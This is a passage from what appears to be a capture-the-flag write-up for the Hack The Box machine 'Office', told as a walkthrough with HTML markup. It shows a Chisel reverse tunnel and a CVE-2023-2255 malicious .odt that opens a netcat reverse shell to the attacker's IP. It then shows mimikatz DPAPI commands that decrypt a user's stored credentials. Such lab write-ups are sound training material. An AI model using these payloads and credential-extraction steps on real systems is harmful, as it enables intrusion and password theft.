</span></span></span><span class=line><span class=cl><span class=go>  TCP    0.0.0.0:49667          0.0.0.0:0              LISTENING
</span></span></span><span class=line><span class=cl><span class=go>  TCP    0.0.0.0:49668          0.0.0.0:0              LISTENING
</span></span></span><span class=line><span class=cl><span class=go>  TCP    0.0.0.0:49683          0.0.0.0:0              LISTENING
</span></span></span><span class=line><span class=cl><span class=go>  TCP    0.0.0.0:58523          0.0.0.0:0              LISTENING
</span></span></span><span class=line><span class=cl><span class=go>  TCP    [::]:80                [::]:0                 LISTENING
</span></span></span><span class=line><span class=cl><span class=go>  TCP    [::]:135               [::]:0                 LISTENING
</span></span></span><span class=line><span class=cl><span class=go>  TCP    [::]:3306              [::]:0                 LISTENING
</span></span></span><span class=line><span class=cl><span class=go>  TCP    [::]:3389              [::]:0                 LISTENING
</span></span></span><span class=line><span class=cl><span class=go>  TCP    [::]:8083              [::]:0                 LISTENING
</span></span></span><span class=line><span class=cl><span class=go>  TCP    [::]:47001             [::]:0                 LISTENING
</span></span></span><span class=line><span class=cl><span class=go>  TCP    [::]:49665             [::]:0                 LISTENING
</span></span></span><span class=line><span class=cl><span class=go>  TCP    [::]:49666             [::]:0                 LISTENING
</span></span></span><span class=line><span class=cl><span class=go>  TCP    [::]:49667             [::]:0                 LISTENING
</span></span></span><span class=line><span class=cl><span class=go>  TCP    [::]:49668             [::]:0                 LISTENING
</span></span></span><span class=line><span class=cl><span class=go>  TCP    [::]:49683             [::]:0                 LISTENING
</span></span></span><span class=line><span class=cl><span class=go>  TCP    [::]:58523             [::]:0                 LISTENING
</span></span></span></code></pre></div><p>Here I note that port <code>135</code> is for <code>Microsoft RPC</code>, <code>3306</code> <code>MySQL</code>, <code>3389</code> <code>Microsoft RDP</code>. Here I note that the port <code>8083</code> is not usual.</p><p>Assuming this is a web internal service (I attempted to use <code>wget</code> and <code>cURL</code> with <code>Powershell</code>, but internet service was disabled, throwing some errors) I pass a <code>Chisel</code> binary for <code>Windows</code>, similar as we passed <code>netcat</code> binary, to attempt a <code>Remote Port Forwarding</code>. In my machine I run:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>❯ chisel server -p 8000 --reverse
</span></span></span></code></pre></div><p>And in the target machine I convert the port <code>8083</code> of the target machine in my port <code>8000</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>C:\Users\Public\Downloads&gt;.\chisel.exe client 10.10.16.15:8000 R:8083
</span></span></span></code></pre></div><p>Now, visiting <code>http://localhost:8083</code> in my <code>Firefox</code> browser shows a new webpage:</p><p><img alt="Office 10" src=/pentesting/images/Office_10.png></p><p>At the top-right side, if we click on <code>Submit Application</code> we are now able to upload files:</p><p><img alt="Office 11" src=/pentesting/images/Office_11.png></p><p>If I try to upload a simple and generic <code>PDF</code> file the site says:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>❌ Accepted File Types : Doc, Docx, Docm, Odt!
</span></span></code></pre></div><p>After attempting many things I find <a href=https://github.com/elweth-sec/CVE-2023-2255 class=external-link target=_blank rel=noopener>this exploit</a> that allow us to inject code in a <code>.odt</code> file:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>❯ git clone https://github.com/elweth-sec/CVE-2023-2255.git
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Cloning into &#39;CVE-2023-2255&#39;...
</span></span></span><span class=line><span class=cl><span class=go>remote: Enumerating objects: 10, done.
</span></span></span><span class=line><span class=cl><span class=go>remote: Counting objects: 100% (10/10), done.
</span></span></span><span class=line><span class=cl><span class=go>remote: Compressing objects: 100% (8/8), done.
</span></span></span><span class=line><span class=cl><span class=go>remote: Total 10 (delta 2), reused 5 (delta 0), pack-reused 0
</span></span></span><span class=line><span class=cl><span class=go>Receiving objects: 100% (10/10), 8.47 KiB | 456.00 KiB/s, done.
</span></span></span><span class=line><span class=cl><span class=go>Resolving deltas: 100% (2/2), done.
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>❯ cd CVE-2023-2255
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>❯ python3 CVE-2023-2255.py --cmd &#39;C:\Windows\System32\cmd.exe /c C:\Users\Public\Downloads\nc.exe 10.10.16.15 443 -e C:\Windows\System32\cmd.exe&#39; --output &#39;reverse.odt&#39;
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>File reverse.odt has been created !
</span></span></span></code></pre></div><p>Once done, I upload the <code>.odt</code> file to <code>http://localhost:8083/resume.php</code> (the internal site found). I also start another <code>netcat</code> listener on port <code>443</code>. I upload the file and, after some time, I get a shell as <code>ppots</code> user:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>❯ rlwrap -cAr nc -lvnp 443
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>listening on [any] 443 ...
</span></span></span><span class=line><span class=cl><span class=go>connect to [10.10.16.15] from (UNKNOWN) [10.10.11.3] 60486
</span></span></span><span class=line><span class=cl><span class=go>Microsoft Windows [Version 10.0.20348.2322]
</span></span></span><span class=line><span class=cl><span class=go>(c) Microsoft Corporation. All rights reserved.
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>C:\Program Files\LibreOffice 5\program&gt;whoami
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>whoami
</span></span></span><span class=line><span class=cl><span class=go>office\ppotts
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>C:\Program Files\LibreOffice 5\program&gt;
</span></span></span></code></pre></div><p>Uploading <code>WinPEAS</code> and running it as this new user does not show much since it returns an error:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>C:\Users\Public\Downloads&gt;.\winpeas.exe
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>&lt;SNIP&gt;
</span></span></span><span class=line><span class=cl><span class=go>Path: C:\Program Files\LibreOffice 5\;C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Users\PPotts\AppData\Local\Microsoft\WindowsApps
</span></span></span><span class=line><span class=cl><span class=go>&lt;SNIP&gt;
</span></span></span><span class=line><span class=cl><span class=go>Unhandled Exception: System.Security.SecurityException: Requested registry access is not allowed.
</span></span></span><span class=line><span class=cl><span class=go>   at System.ThrowHelper.ThrowSecurityException(ExceptionResource resource)
</span></span></span><span class=line><span class=cl><span class=go>   at Microsoft.Win32.RegistryKey.OpenSubKey(String name, Boolean writable)
</span></span></span><span class=line><span class=cl><span class=go>   at winPEAS.Helpers.Registry.RegistryHelper.GetRegValue(String hive, String path, String value)
</span></span></span><span class=line><span class=cl><span class=go>   at winPEAS.Checks.SystemInfo.PrintCachedCreds()
</span></span></span><span class=line><span class=cl><span class=go>   at winPEAS.Helpers.CheckRunner.Run(Action action, Boolean isDebug, String description)
</span></span></span><span class=line><span class=cl><span class=go>   at System.Collections.Generic.List`1.ForEach(Action`1 action)
</span></span></span><span class=line><span class=cl><span class=go>   at winPEAS.Checks.Checks.RunChecks(Boolean isAllChecks, Boolean wait)
</span></span></span><span class=line><span class=cl><span class=go>   at winPEAS.Checks.Checks.&lt;&gt;c__DisplayClass29_0.&lt;Run&gt;b__1()
</span></span></span><span class=line><span class=cl><span class=go>   at winPEAS.Helpers.CheckRunner.Run(Action action, Boolean isDebug, String description)
</span></span></span><span class=line><span class=cl><span class=go>   at winPEAS.Checks.Checks.Run(String[] args)
</span></span></span><span class=line><span class=cl><span class=go>   at winPEAS.Program.Main(String[] args)
</span></span></span></code></pre></div><p>Within <code>C:\Users\PPotts\AppData</code> we have some directories:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>C:\Users\Public\Downloads&gt;dir C:\Users\PPotts\AppData\Roaming\ /a:d
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>dir C:\Users\PPotts\AppData\Roaming\ /a:d
</span></span></span><span class=line><span class=cl><span class=go> Volume in drive C has no label.
</span></span></span><span class=line><span class=cl><span class=go> Volume Serial Number is C626-9388
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go> Directory of C:\Users\PPotts\AppData\Roaming
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>01/17/2024  04:45 PM    &lt;DIR&gt;          .
</span></span></span><span class=line><span class=cl><span class=go>05/02/2023  04:01 PM    &lt;DIR&gt;          ..
</span></span></span><span class=line><span class=cl><span class=go>05/04/2023  10:58 AM    &lt;DIR&gt;          Adobe
</span></span></span><span class=line><span class=cl><span class=go>01/17/2024  04:45 PM    &lt;DIR&gt;          LibreOffice
</span></span></span><span class=line><span class=cl><span class=go>01/18/2024  10:34 AM    &lt;DIR&gt;          Microsoft
</span></span></span><span class=line><span class=cl><span class=go>05/09/2023  02:16 PM    &lt;DIR&gt;          NuGet
</span></span></span><span class=line><span class=cl><span class=go>               0 File(s)              0 bytes
</span></span></span><span class=line><span class=cl><span class=go>               6 Dir(s)   4,927,291,392 bytes free
</span></span></span></code></pre></div><p>and inside <code>C:\Users\PPotts\AppData\Roaming\Microsoft</code> I can see a <code>Credentials</code> directory:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>C:\Users\Public\Downloads&gt;dir C:\Users\PPotts\AppData\Roaming\Microsoft /a:d
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>dir C:\Users\PPotts\AppData\Roaming\Microsoft /a:d
</span></span></span><span class=line><span class=cl><span class=go> Volume in drive C has no label.
</span></span></span><span class=line><span class=cl><span class=go> Volume Serial Number is C626-9388
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go> Directory of C:\Users\PPotts\AppData\Roaming\Microsoft
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>01/18/2024  10:34 AM    &lt;DIR&gt;          .
</span></span></span><span class=line><span class=cl><span class=go>01/17/2024  04:45 PM    &lt;DIR&gt;          ..
</span></span></span><span class=line><span class=cl><span class=go>05/02/2023  04:13 PM    &lt;DIR&gt;          AddIns
</span></span></span><span class=line><span class=cl><span class=go>05/09/2023  04:14 PM    &lt;DIR&gt;          Credentials
</span></span></span><span class=line><span class=cl><span class=go>05/04/2023  10:58 AM    &lt;DIR&gt;          Crypto
</span></span></span><span class=line><span class=cl><span class=go>05/04/2023  10:58 AM    &lt;DIR&gt;          Internet Explorer
</span></span></span><span class=line><span class=cl><span class=go>05/04/2023  11:07 AM    &lt;DIR&gt;          MMC
</span></span></span><span class=line><span class=cl><span class=go>01/18/2024  10:34 AM    &lt;DIR&gt;          Network
</span></span></span><span class=line><span class=cl><span class=go>05/02/2023  04:13 PM    &lt;DIR&gt;          Office
</span></span></span><span class=line><span class=cl><span class=go>05/02/2023  04:13 PM    &lt;DIR&gt;          Proof
</span></span></span><span class=line><span class=cl><span class=go>05/04/2023  10:58 AM    &lt;DIR&gt;          Protect
</span></span></span><span class=line><span class=cl><span class=go>05/04/2023  10:59 AM    &lt;DIR&gt;          Spelling
</span></span></span><span class=line><span class=cl><span class=go>05/02/2023  04:13 PM    &lt;DIR&gt;          SystemCertificates
</span></span></span><span class=line><span class=cl><span class=go>01/17/2024  05:20 PM    &lt;DIR&gt;          Teams
</span></span></span><span class=line><span class=cl><span class=go>05/04/2023  11:05 AM    &lt;DIR&gt;          Templates
</span></span></span><span class=line><span class=cl><span class=go>05/02/2023  04:13 PM    &lt;DIR&gt;          UProof
</span></span></span><span class=line><span class=cl><span class=go>05/09/2023  10:16 AM    &lt;DIR&gt;          Vault
</span></span></span><span class=line><span class=cl><span class=go>05/09/2023  11:01 AM    &lt;DIR&gt;          Windows
</span></span></span><span class=line><span class=cl><span class=go>05/02/2023  04:13 PM    &lt;DIR&gt;          Word
</span></span></span><span class=line><span class=cl><span class=go>               0 File(s)              0 bytes
</span></span></span><span class=line><span class=cl><span class=go>              19 Dir(s)   4,927,291,392 bytes free
</span></span></span></code></pre></div><p>and inside it we have some hidden files:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>C:\Users\Public\Downloads&gt;dir C:\Users\PPotts\AppData\Roaming\Microsoft\Credentials /a:h
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>dir C:\Users\PPotts\AppData\Roaming\Microsoft\Credentials /a:h
</span></span></span><span class=line><span class=cl><span class=go> Volume in drive C has no label.
</span></span></span><span class=line><span class=cl><span class=go> Volume Serial Number is C626-9388
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go> Directory of C:\Users\PPotts\AppData\Roaming\Microsoft\Credentials
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>05/09/2023  02:08 PM               358 18A1927A997A794B65E9849883AC3F3E
</span></span></span><span class=line><span class=cl><span class=go>05/09/2023  04:03 PM               398 84F1CAEEBF466550F4967858F9353FB4
</span></span></span><span class=line><span class=cl><span class=go>01/18/2024  12:53 PM               374 E76CCA3670CD9BB98DF79E0A8D176F1E
</span></span></span><span class=line><span class=cl><span class=go>               3 File(s)          1,130 bytes
</span></span></span><span class=line><span class=cl><span class=go>               0 Dir(s)   4,925,820,928 bytes free
</span></span></span></code></pre></div><p>Everything indicates that we should focus on <code>Data Protection API</code> (<code>DPAPI</code>), since we have access to these files as it is explained in <a href=https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#dpapi class=external-link target=_blank rel=noopener>HackTricks</a> and also <a href=https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/dpapi-extracting-passwords class=external-link target=_blank rel=noopener>here</a>. I decide to pass <code>mimikatz</code> to the target machine, run it as <code>ppotts</code> user and then start checking these credentials with the command:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>dpapi::cred /in:&lt;Path-to-Credential&gt;
</span></span></span></code></pre></div><p>so we have:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>C:\Users\Public\Downloads\mimikatz.exe
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
</span></span></span><span class=line><span class=cl><span class=go> .## ^ ##.  &#34;A La Vie, A L&#39;Amour&#34; - (oe.eo)
</span></span></span><span class=line><span class=cl><span class=go> ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
</span></span></span><span class=line><span class=cl><span class=go> ## \ / ##       &gt; https://blog.gentilkiwi.com/mimikatz
</span></span></span><span class=line><span class=cl><span class=go> &#39;## v ##&#39;       Vincent LE TOUX             ( vincent.letoux@gmail.com )
</span></span></span><span class=line><span class=cl><span class=go>  &#39;#####&#39;        &gt; https://pingcastle.com / https://mysmartlogon.com ***/
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>mimikatz # dpapi::cred /in:C:\Users\PPotts\AppData\Roaming\Microsoft\credentials\84F1CAEEBF466550F4967858F9353FB4
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>**BLOB**
</span></span></span><span class=line><span class=cl><span class=go>  dwVersion          : 00000001 - 1
</span></span></span><span class=line><span class=cl><span class=go>  guidProvider       : {df9d8cd0-1501-11d1-8c7a-00c04fc297eb}
</span></span></span><span class=line><span class=cl><span class=go>  dwMasterKeyVersion : 00000001 - 1
</span></span></span><span class=line><span class=cl><span class=go>  guidMasterKey      : {191d3f9d-7959-4b4d-a520-a444853c47eb}
</span></span></span><span class=line><span class=cl><span class=go>  dwFlags            : 20000000 - 536870912 (system ; )
</span></span></span><span class=line><span class=cl><span class=go>  dwDescriptionLen   : 0000003a - 58
</span></span></span><span class=line><span class=cl><span class=go>  szDescription      : Enterprise Credential Data
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>  algCrypt           : 00006603 - 26115 (CALG_3DES)
</span></span></span><span class=line><span class=cl><span class=go>  dwAlgCryptLen      : 000000c0 - 192
</span></span></span><span class=line><span class=cl><span class=go>  dwSaltLen          : 00000010 - 16
</span></span></span><span class=line><span class=cl><span class=go>  pbSalt             : 649c4466d5d647dd2c595f4e43fb7e1d
</span></span></span><span class=line><span class=cl><span class=go>  dwHmacKeyLen       : 00000000 - 0
</span></span></span><span class=line><span class=cl><span class=go>  pbHmackKey         :
</span></span></span><span class=line><span class=cl><span class=go>  algHash            : 00008004 - 32772 (CALG_SHA1)
</span></span></span><span class=line><span class=cl><span class=go>  dwAlgHashLen       : 000000a0 - 160
</span></span></span><span class=line><span class=cl><span class=go>  dwHmac2KeyLen      : 00000010 - 16
</span></span></span><span class=line><span class=cl><span class=go>  pbHmack2Key        : 32e88dfd1927fdef0ede5abf2c024e3a
</span></span></span><span class=line><span class=cl><span class=go>  dwDataLen          : 000000c0 - 192
</span></span></span><span class=line><span class=cl><span class=go>  pbData             : f73b168ecbad599e5ca202cf9ff719ace31cc92423a28aff5838d7063de5cccd4ca86bfb2950391284b26a34b0eff2dbc9799bdd726df9fad9cb284bacd7f1ccbba0fe140ac16264896a810e80cac3b68f82c80347c4deaf682c2f4d3be1de025f0a68988fa9d633de943f7b809f35a141149ac748bb415990fb6ea95ef49bd561eb39358d1092aef3bbcc7d5f5f20bab8d3e395350c711d39dbe7c29d49a5328975aa6fd5267b39cf22ed1f9b933e2b8145d66a5a370dcf76de2acdf549fc97
</span></span></span><span class=line><span class=cl><span class=go>  dwSignLen          : 00000014 - 20
</span></span></span><span class=line><span class=cl><span class=go>  pbSign             : 21bfb22ca38e0a802e38065458cecef00b450976
</span></span></span></code></pre></div><p>I repeat these for all the credentials found (that were 3)</p><p>The important thing from this output is the <code>guidMasterKey</code> value (without <code>{}</code> characters). So I save them for all 3 credentials.</p><p>Now, we check for <code>SID</code> for users:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>C:\Users\Public\Downloads&gt;powershell
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>powershell
</span></span></span><span class=line><span class=cl><span class=go>Windows PowerShell
</span></span></span><span class=line><span class=cl><span class=go>Copyright (C) Microsoft Corporation. All rights reserved.
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>PS C:\Users\Public\Downloads&gt; dir C:\Users\PPotts\appdata\roaming\microsoft\protect
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>dir C:\Users\PPotts\appdata\roaming\microsoft\protect
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>    Directory: C:\Users\PPotts\appdata\roaming\microsoft\protect
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Mode                 LastWriteTime         Length Name
</span></span></span><span class=line><span class=cl><span class=go>----                 -------------         ------ ----
</span></span></span><span class=line><span class=cl><span class=go>d---s-         5/21/2024   1:37 AM                S-1-5-21-1199398058-4196589450-691661856-1107
</span></span></span></code></pre></div><p>where we have an <code>SID</code> value <code>S-1-5-21-1199398058-4196589450-691661856-1107</code>.</p><p>So far, we have found an <code>SID</code> for a user and some <code>guidMasterKey</code> values. We change the <code>SID</code> and <code>guidMasterKey</code> values running in <code>mimikatz</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>dpapi::masterkey /in:&lt;Path-to-SID&gt;\&lt;guidMasterKey&gt; /rpc
</span></span></span></code></pre></div><p>so we run:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>mimikatz # dpapi::masterkey /in:C:\Users\PPotts\appdata\roaming\microsoft\protect\S-1-5-21-1199398058-4196589450-691661856-1107\191d3f9d-7959-4b4d-a520-a444853c47eb /rpc
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>**MASTERKEYS**
</span></span></span><span class=line><span class=cl><span class=go>  dwVersion          : 00000002 - 2
</span></span></span><span class=line><span class=cl><span class=go>  szGuid             : {191d3f9d-7959-4b4d-a520-a444853c47eb}
</span></span></span><span class=line><span class=cl><span class=go>  dwFlags            : 00000000 - 0
</span></span></span><span class=line><span class=cl><span class=go>  dwMasterKeyLen     : 00000088 - 136
</span></span></span><span class=line><span class=cl><span class=go>  dwBackupKeyLen     : 00000068 - 104
</span></span></span><span class=line><span class=cl><span class=go>  dwCredHistLen      : 00000000 - 0
</span></span></span><span class=line><span class=cl><span class=go>  dwDomainKeyLen     : 00000174 - 372
</span></span></span><span class=line><span class=cl><span class=go>[masterkey]
</span></span></span><span class=line><span class=cl><span class=go>  **MASTERKEY**
</span></span></span><span class=line><span class=cl><span class=go>    dwVersion        : 00000002 - 2
</span></span></span><span class=line><span class=cl><span class=go>    salt             : c521daa0857ee4fa6e4246266081e94c
</span></span></span><span class=line><span class=cl><span class=go>    rounds           : 00004650 - 18000
</span></span></span><span class=line><span class=cl><span class=go>    algHash          : 00008009 - 32777 (CALG_HMAC)
</span></span></span><span class=line><span class=cl><span class=go>    algCrypt         : 00006603 - 26115 (CALG_3DES)
</span></span></span><span class=line><span class=cl><span class=go>    pbKey            : 1107e1ab3e107528a73a2dafc0a2db28de1ea0a07e92cff03a935635013435d75e41797f612903d6eea41a8fc4f7ebe8d2fbecb0c74cdebb1e7df3c692682a066faa3edf107792d116584625cc97f0094384a5be811e9d5ce84e5f032704330609171c973008d84f
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>[backupkey]
</span></span></span><span class=line><span class=cl><span class=go>  **MASTERKEY**
</span></span></span><span class=line><span class=cl><span class=go>    dwVersion        : 00000002 - 2
</span></span></span><span class=line><span class=cl><span class=go>    salt             : a2741b13d7261697be4241ebbe05098a
</span></span></span><span class=line><span class=cl><span class=go>    rounds           : 00004650 - 18000
</span></span></span><span class=line><span class=cl><span class=go>    algHash          : 00008009 - 32777 (CALG_HMAC)
</span></span></span><span class=line><span class=cl><span class=go>    algCrypt         : 00006603 - 26115 (CALG_3DES)
</span></span></span><span class=line><span class=cl><span class=go>    pbKey            : 21bf24763fbb1400010c08fccc5423fe7da8190c61d3006f2d5efd5ea586f463116805692bae637b2ab548828b3afb9313edc715edd11dc21143f4ce91f4f67afe987005320d3209
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>[domainkey]
</span></span></span><span class=line><span class=cl><span class=go>  **DOMAINKEY**
</span></span></span><span class=line><span class=cl><span class=go>    dwVersion        : 00000002 - 2
</span></span></span><span class=line><span class=cl><span class=go>    dwSecretLen      : 00000100 - 256
</span></span></span><span class=line><span class=cl><span class=go>    dwAccesscheckLen : 00000058 - 88
</span></span></span><span class=line><span class=cl><span class=go>    guidMasterKey    : {e523832a-e126-4d6e-ac04-ed10da72b32f}
</span></span></span><span class=line><span class=cl><span class=go>    pbSecret         : 159613bdc2d90dd4834a37e29873ce04c74722a706d0ba4770865039b3520ff46cf9c9281542665df2e72db48f67e16e2014e07b88f8b2f7d376a8b9d47041768d650c20661aee31dc340aead98b7600662d2dc320b4f89cf7384c2a47809c024adf0694048c38d6e1e3e10e8bd7baa7a6f1214cd3a029f8372225b2df9754c19e2ae4bc5ff4b85755b4c2dfc89add9f73c54ac45a221e5a72d3efe491aa6da8fb0104a983be20af3280ae68783e8648df413d082fa7d25506e9e6de1aadbf9cf93ec8dfc5fab4bfe1dd1492dbb679b1fa25c3f15fb8500c6021f518c74e42cd4b5d5d6e1057f912db5479ebda56892f346b4e9bf6404906c7cd65a54eea2842
</span></span></span><span class=line><span class=cl><span class=go>    pbAccesscheck    : 1430b9a3c4ab2e9d5f61dd6c62aab8e1742338623f08461fe991cccd5b3e4621d4c8e322650460181967c409c20efcf02e8936c007f7a506566d66ba57448aa8c3524f0b9cf881afcbb80c9d8c341026f3d45382f63f8665
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Auto SID from path seems to be: S-1-5-21-1199398058-4196589450-691661856-1107
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>[backupkey] without DPAPI_SYSTEM:
</span></span></span><span class=line><span class=cl><span class=go>  key : 4d1b2c18baba7442e79d33cc771bf54027ae2500e08da3ecfccf91303bd471b6
</span></span></span><span class=line><span class=cl><span class=go>  sha1: eeb787c4259e3c8b8408201ee5e54fc29fad22b2
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>[domainkey] with RPC
</span></span></span><span class=line><span class=cl><span class=go>[DC] &#39;office.htb&#39; will be the domain
</span></span></span><span class=line><span class=cl><span class=go>[DC] &#39;DC.office.htb&#39; will be the DC server
</span></span></span><span class=line><span class=cl><span class=go>  key : 87eedae4c65e0db47fcbc3e7e337c4cce621157863702adc224caf2eedcfbdbaadde99ec95413e18b0965dcac70344ed9848cd04f3b9491c336c4bde4d1d8166
</span></span></span><span class=line><span class=cl><span class=go>  sha1: 85285eb368befb1670633b05ce58ca4d75c73c77
</span></span></span></code></pre></div><p>here the important value is the <code>key</code> parameter.</p><p>Finally, we can obtain the password for this user passing the credential, the <code>guidMasterKey</code> of that credential and the <code>key</code> previously found, so we run in <code>mimikatz</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>dpapi::cred /in:&lt;path-to-credential&gt; /&lt;guidMasterKey&gt;::&lt;key-value-found&gt;
</span></span></span></code></pre></div><p>and we get:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>mimikatz # dpapi::cred /in:C:\Users\PPotts\AppData\Roaming\Microsoft\credentials\84F1CAEEBF466550F4967858F9353FB4 /191d3f9d-7959-4b4d-a520-a444853c47eb::87eedae4c65e0db47fcbc3e7e337c4cce621157863702adc224caf2eedcfbdbaadde99ec95413e18b0965dcac70344ed9848cd04f3b9491c336c4bde4d1d8166
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>**BLOB**
</span></span></span><span class=line><span class=cl><span class=go>  dwVersion          : 00000001 - 1
</span></span></span><span class=line><span class=cl><span class=go>  guidProvider       : {df9d8cd0-1501-11d1-8c7a-00c04fc297eb}
</span></span></span><span class=line><span class=cl><span class=go>  dwMasterKeyVersion : 00000001 - 1
</span></span></span><span class=line><span class=cl><span class=go>  guidMasterKey      : {191d3f9d-7959-4b4d-a520-a444853c47eb}
</span></span></span><span class=line><span class=cl><span class=go>  dwFlags            : 20000000 - 536870912 (system ; )
</span></span></span><span class=line><span class=cl><span class=go>  dwDescriptionLen   : 0000003a - 58
</span></span></span><span class=line><span class=cl><span class=go>  szDescription      : Enterprise Credential Data
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>  algCrypt           : 00006603 - 26115 (CALG_3DES)
</span></span></span><span class=line><span class=cl><span class=go>  dwAlgCryptLen      : 000000c0 - 192
</span></span></span><span class=line><span class=cl><span class=go>  dwSaltLen          : 00000010 - 16
</span></span></span><span class=line><span class=cl><span class=go>  pbSalt             : 649c4466d5d647dd2c595f4e43fb7e1d
